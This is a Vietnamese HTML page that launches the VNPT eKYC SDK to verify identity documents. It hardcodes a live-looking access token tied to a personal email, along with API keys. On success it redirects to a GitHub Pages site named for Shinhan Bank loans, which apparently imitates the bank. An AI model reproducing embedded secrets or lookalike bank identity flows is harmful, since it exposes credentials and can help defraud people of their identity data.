<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>eKYC SDK</title>
    <link rel="stylesheet" href="src/css/styles.css" />
    <script src="lib/web-sdk-version-3.1.0.0.js"></script>
    <script src="lib/VNPTQRBrowserApp.js"></script>
    <script src="lib/VNPTBrowserSDKAppV4.0.0.js"></script>
  </head>

  <body>
    <div id="ekyc_sdk_intergrated"></div>
    <!-- Phần tử để hiển thị thông báo lỗi -->
    <div id="error-message"></div>
    <script>
      // Hàm callback xử lý kết quả sau khi luồng eKYC hoàn tất
      const CALL_BACK_END_FLOW = async (result) => {
        console.log('Kết quả từ SDK ==>', result);
        const errorMessageDiv = document.getElementById('error-message');

        if (result.success) {  // Điều chỉnh dựa trên cấu trúc thực tế của result
          // Chuyển hướng đến URL khi xác thực thành công
          window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
        } else {
          // Hiển thị thông báo lỗi
          const errorMessage = result.error_message || 'Xác thực thất bại. Vui lòng thử lại.';
          errorMessageDiv.textContent = errorMessage;
        }
      };

      // --- Cấu hình của khách hàng ---
      const BACKEND_URL = 'https://api.idg.vnpt.vn'; // URL của dịch vụ eKYC
      const TOKEN_ID = '384b4517-af4e-391c-e063-62199f0a23e6';
      const TOKEN_KEY = 'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAMxOJVBGwpOeSFmfi0E02+EnXEoD3vWehNHUUSr1ob9I55gP132hfViwRxnYMRL/fZbOzBLGoHElIl2m87ebQFkCAwEAAQ==';
      
      // QUAN TRỌNG: Access Token nên được lấy từ backend của bạn
      const ACCESS_TOKEN = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0cmFuc2FjdGlvbl9pZCI6IjQ0ODFjOGU1LTY4Y2YtNGFiZi1iMzVmLTJkYjVlMTlmMGNlZSIsInN1YiI6ImM2MjBhYzk1LTUwYjgtMTFmMC05M2ZjLTMxNGYzZmU2Y2YxMSIsImF1ZCI6WyJyZXN0c2VydmljZSJdLCJ1c2VyX25hbWUiOiJkdXllbmR1eWVuZHV5ZW4zMThAZ21haWwuY29tIiwic2NvcGUiOlsicmVhZCJdLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdCIsIm5hbWUiOiJkdXllbmR1eWVuZHV5ZW4zMThAZ21haWwuY29tIiwiZXhwIjoxNzUxMTc4NDc2LCJ1dWlkX2FjY291bnQiOiJjNjIwYWM5NS01MGI4LTExZjAtOTNmYy0zMTRmM2ZlNmNmMTEiLCJhdXRob3JpdGllcyI6WyJVU0VSIl0sImp0aSI6IjBjYjI2MmQxLTMwMzctNGRkNi04MDI1LWIyMWIwYmQ4ZDc0NSIsImNsaWVudF9pZCI6ImNsaWVudGFwcCJ9.d-hMtvxs_cw9MIhYHiX22Ng9vdAk5x_WK-gVEXK0atDnfSyGIaWmd0ZFnA4Vx9NRkJZYSecOlnrTEtcN9NXBi4j6JIjihG03lljH-sDrKEbD4CPqgvkUe5manTfKTuIPCZt4GVtENQ6Io9DkWLX9-hk091ppmw9nd-aqx9GB9-NgNVycR8vumhQ_qjFOogkNaQdCSmwGEa-MS0Y6_Lw0it7l3s6fVOsC1CcYOV4Calm5GxWuk0LGBaBCWOurCVQd1DAF7PKiOacHkdUaO9ydH40l-YMoQHCRR9Fz4cijeuoQyiXYx2vT1EJeT8FoUv-yEtVAdhi2be5gzaYz-iIVJA'; // <--- THAY THẾ BẰNG ACCESS TOKEN CỦA BẠN

      const HAS_BACKGROUND_IMAGE = true;
      const LIST_TYPE_DOCUMENT = [-1, 4, 5, 6, 7, 9]; // Đã thêm '9' cho Căn cước công dân gắn chip

      const dataConfig = {
        BACKEND_URL,
        TOKEN_ID,
        TOKEN_KEY,
        ACCESS_TOKEN,
        CALL_BACK_END_FLOW,
        HAS_BACKGROUND_IMAGE,
        LIST_TYPE_DOCUMENT,
      };

      // Khởi chạy SDK sau khi trang đã tải xong
      window.addEventListener('DOMContentLoaded', function () {
        const errorMessageDiv = document.getElementById('error-message');
        errorMessageDiv.textContent = ''; // Xóa thông báo lỗi cũ (nếu có)

        if (window.SDK) {
          window.SDK.launch(dataConfig);
        } else {
          errorMessageDiv.textContent = 'Khởi tạo SDK thất bại. Vui lòng kiểm tra lại việc nhúng script.';
          console.error('Không tìm thấy VNPT eKYC SDK. Vui lòng kiểm tra lại việc nhúng script.');
        }
      });
    </script>
  </body>
</html>